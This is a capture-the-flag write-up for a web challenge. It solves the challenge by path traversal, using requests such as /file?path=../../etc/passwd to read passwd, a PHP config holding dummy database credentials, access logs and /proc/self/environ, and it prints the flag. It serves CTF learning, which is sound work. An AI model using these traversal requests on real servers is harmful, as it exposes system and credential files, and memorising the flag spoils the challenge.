# The Robot's Tail

## Description
You enter a virtual maze, a labyrinth of shifting corridors and endless paths. A guardian robot patrols the floor, leaving a trail behind as it moves. Follow the path it carves, trace its movements carefully, and uncover the key it leads you to. Only by following the robot’s trail can you reach the door to the next floor.

## Solve
**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`

- In this challenge, I first used the inspect element and checked the code. There, in hidden class, the following info was given:

```
<div class="hidden">
        <p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
</div>
```

- Now we needed to go to the /robot.txt filee. So, I set one of the paths links to the robots.txt file and found this:

```
User-agent: *

# We value our digital privacy and have restricted access to certain system-level configurations.
Disallow: /file?path=../../etc/passwd
Disallow: /file?path=../../../etc/passwd

# Hint for curious explorers: 
# Sometimes system files like /etc/passwd can reveal interesting information...
# But remember to respect privacy boundaries!
```

- Now, setting the path `/file?path=../../etc/passwd` and going there, we get: 

```
"root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
            "webadmin:x:1000:1000:Check the web server config at /var/www/html/config.php:/home/webadmin:/bin/bash\n"
``` 

- This time, it says to check the configs. So setting the path accordingly and going to that endpoint, we find:

```
"<?php\n"
            "// Database configuration\n"
            "$db_host = 'localhost';\n"
            "$db_user = 'admin';\n"
            "$db_pass = 's3cr3t_p@ssw0rd';\n"
            "// Debug info: Check the access logs for unusual activity\n"
            "// Log location: /var/log/apache2/access.log\n"
            "?>"
```

- This time we go to the access logs to get this info:

```
"127.0.0.1 - - [01/Jan/2023:10:30:45 +0000] \"GET / HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0\"\n"
            "192.168.1.100 - - [01/Jan/2023:10:31:22 +0000] \"GET /file?path=../../etc/passwd HTTP/1.1\" 200 567 \"-\" \"Python-urllib\"\n"
            "10.0.0.50 - - [01/Jan/2023:10:32:15 +0000] \"GET /admin HTTP/1.1\" 404 289 \"-\" \"curl\"\n"
            "# Interesting environment variables might be found at /proc/self/environ\n"
            "203.0.113.5 - - [01/Jan/2023:10:33:01 +0000] \"POST /login HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0\"\n"
```

- Since we already checked the passwd path, we check the environ path and get this:

```
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
            "HOSTNAME=web-server-01\n"
            "USER=www-data\n"
            "HOME=/var/www\n"
            "SECRET_LOCATION=/home/ctf/.secret\n"
            "PWD=/var/www/html\n"
            "LANG=C.UTF-8\n"
            "SHLVL=1\n"
```

- Here, we finally get the path to the secret location. Using that, we get: 

```
"Directory listing for /home/ctf/.secret:\n"
            "total 12\n"
            "drwx------ 2 ctf ctf 4096 Jan  1 10:00 .\n"
            "drwxr-xr-x 5 ctf ctf 4096 Jan  1 09:55 ..\n"
            "-r-------- 1 ctf ctf   48 Jan  1 10:00 flag.txt\n"
            "\n"
```

- Now finally going to the path `/home/ctf/.secret/flag.txt`, we get the flag.